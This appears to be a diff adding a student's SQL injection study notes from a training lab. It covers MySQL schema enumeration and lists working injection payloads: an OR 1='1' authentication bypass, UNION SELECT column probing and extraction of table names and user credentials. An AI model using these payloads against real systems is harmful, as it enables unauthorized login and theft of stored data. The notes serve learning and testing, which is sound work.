@@ -1,0 +1,63 @@
+SQL
+https://sqlbolt.com/
+  S tructured Q uery L anguage - ANSI Standard
+  Additional commands added by vendors
+  Relational
+SELECT - Extracts data from a database
+UNION - Used to combine the result-set of two or more SELECT statements
+
+database>table>column
+  Requires Valid SQL Queries
+  Fully patched systems can be vulnerable due to misconfiguration
+  Input Field Sanitization
+  String vs Integer Values
+  Is information_schema Database available?
+  GET Request versus POST Request HTTP methods
+
+Unsanitized: input fields can be found using a Single Quote ⇒ '
+  Will return extraneous information
+  ' closes a variable, to allow for additional statements/clauses
+  May show no errors or generic error (harder Injection)
+‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
+usig inspect grab the post message convert the request to raw      <<<<------- Authentication bypass
+<IP>/login.php?<RAW>
+
+
+
+
+
+
+
+
+DEMO OPNOTES
+mysql - enter sql mode -  gives some server info
+show databases ;
+  (default databases)
+  -information_schema
+  -mysql
+  -performance_scheme
+use information_schema ; (change database)
+show tables ;
+show columns from columns;
+select table_schema, table_name, column_name from information_schema columns ;   ***************
+use session ; -- switched databases
+show tables from session ;  (could just use show tables since already in session)
+select username,passwd,studentID from session.userinfo ;
+select name,cost,color from session.car ;
+select name,size,cost from session.tires ;
+
+1 - Identify vulnerable field
+Test all options 
+find weak one
+Audi ' OR 1='1’
+2. check for other columns
+check if we're being shown everything
+Audi 'UNION SELECT 1,2,3,4,5#
+3. Make the golden statement
+UNION SELECT table_schema, table_name, column_name, from information_schema.columns
+Audi ' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns
+UNION SELECT type,2,cost,color,year from session.car
+UNION SELECT carID,2,type,name,year from session.car
+
+
+
